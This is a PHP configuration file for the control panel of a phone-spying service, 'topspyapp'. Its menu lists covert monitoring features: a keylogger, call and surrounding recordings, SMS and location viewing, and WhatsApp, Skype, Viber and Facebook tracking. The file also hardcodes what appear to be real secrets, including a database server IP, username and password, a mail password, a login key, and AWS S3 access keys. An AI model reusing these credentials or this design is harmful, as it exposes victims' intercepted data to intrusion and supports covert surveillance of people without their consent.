<?php

$default = array(
    'build' => 81,
    'domain' => 'http://cp-new.topspyapp.com',
    'staticDomain' => 'http://cp-new.topspyapp.com/static',
    'cookieDomain' => '.cp-new.topspyapp.com',
    'supportEmail' => 'support@topspyapp.com',
    'session' => array(
        'rememberMeTime' => 2592000 // 30 days
    ),
    'logger' => array(
        'stream' => array(
            'filename' => ROOT_PATH . 'logs/system.log'
        ),
        'mail' => array(
            'from' => 'orest@dataedu.com',
            'to' => 'orest@dataedu.com',
            'subject' => 'TS CP Logger'
        )
    ),
    'db' => array(
        'host' => '66.232.96.3',
        'username' => 'user_data',
        'password' => 'pai1Geo9',
        'dbname' => 'user_data',
        'options' => array(
            //PDO::MYSQL_ATTR_INIT_COMMAND => 'set names utf8;',
            PDO::MYSQL_ATTR_INIT_COMMAND => 'set names latin1;',
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
        )
    ),
    'mail' => array(
        'host' => 'topspyapp.com',
        'port' => 25,
        'username' => 'no-reply@topspyapp.com',
        'password' => 'LKE@#Qo3eS#Qe3',
        'from' => 'no-reply@topspyapp.com',
        'fromName' => 'Topspyapp.com',
        'logoImageUrl' => 'http://www.topspyapp.com/wp-content/themes/topspyapp/images/logo.png',
        'logoUrl' => 'http://cp.topspyapp.com/'
    ),
    'fenom' => array(
        'templatesDir' => ROOT_PATH . 'templates/',
        'compileDir' => ROOT_PATH . 'tmp/',
        'options' => array(
            'force_include' => true,
            //'strip' => true
        )
    ),
    'locales' => array(
        'en-GB' => 'English',
        //'ru-RU' => 'Русский'
    ),
    'cpMenu' => array(
        'calls' => 'View Calls',
        'sms' => 'View SMS',
        'locations' => 'View Locations',
        'bookmarks' => array(
            'name' => 'View Bookmarks',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'browserHistory' => array(
            'name' => 'View Browser History',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'calendar' => array(
            'name' => 'View Calendar',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'contacts' => array(
            'name' => 'View Contacts',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'keylogger' => array(
            'name' => 'Keylogger',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'surrounding' => 'Surrounding Records',
        'callRecordings' => array(
            'name' => 'Call Recordings',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                } elseif ($di['currentDevice']['os'] == 'ios') {
                    return preg_match('#^iphone 5#i', $di['currentDevice']['model']);
                }

                return true;
            }
        ),
        'photos' => array(
            'name' => 'View Photos',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'videos' => array(
            'name' => 'View Videos',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'viber' => array(
            'name' => 'Viber Tracking',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'skype' => array(
            'name' => 'Skype Tracking',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'whatsapp' => array(
            'name' => 'Whatsapp Tracking',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'facebook' => array(
            'name' => 'Facebook Messages',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'vk' => array(
            'name' => 'VK Messages',
            'show' => function($di) {
                if ($di['locale'] != 'ru-RU') {
                    return false;
                }
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'emails' => array(
            'name' => 'View Emails',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'applications' => array(
            'name' => 'View Applications',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'smsCommands' => array(
            'name' => 'Sms Commands',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                } elseif ($di['currentDevice']['os'] == 'android') {
                    return compareOSVersion('android', '4.4', $di['currentDevice']['os_version'], '<');
                }

                return true;
            }
        ),
        'settings' => 'Phone Settings'
    ),
    'contents' => array(
        'how-to-install/android-instructions.html' => 'Android Installation Guide',
        'how-to-install/blackberry-instructions.html' => 'BlackBerry Installation Guide',
        'how-to-install/ios-instructions.html' => 'iPhone Installation Guide',
        'how-to-install/root-instructions.html' => 'Root Instructions'
    ),
    'simpleLoginKey' => 'TR$dtR!E:067mjpp-S%%;l@2|eRy.*~e',
    's3' => array(
        'key' => 'AKIAIHGTCBLPUEKBCRGA',
        'secret' => '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',
        'bucket' => 'topspy_user_media'
    ),
    'cloudFront' => array(
        'domain' => 'http://media.topspyapp.com/',
        'keyPairId' => 'APKAJEW3MLUPI6ZCDZBA',
        'privateKeyFile' => ROOT_PATH . 'cloudFrontPrivateKey'
    )
);

if (APPLICATION_ENV == 'production') {
    return $default;
} else if (APPLICATION_ENV == 'development') {
    if (file_exists(ROOT_PATH . 'development.config.php')) {
        return require ROOT_PATH . 'development.config.php';
    } else {
        return $default;
    }
} else if (APPLICATION_ENV == 'testing') {
    return array_merge($default, array(
        'db' => array(
            'host' => 'localhost',
            'username' => 'root',
            'password' => '',
            'dbname' => 'user_data_test',
            'options' => array(
                PDO::MYSQL_ATTR_INIT_COMMAND => 'set names latin1;',
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
            )
        )
    ));
}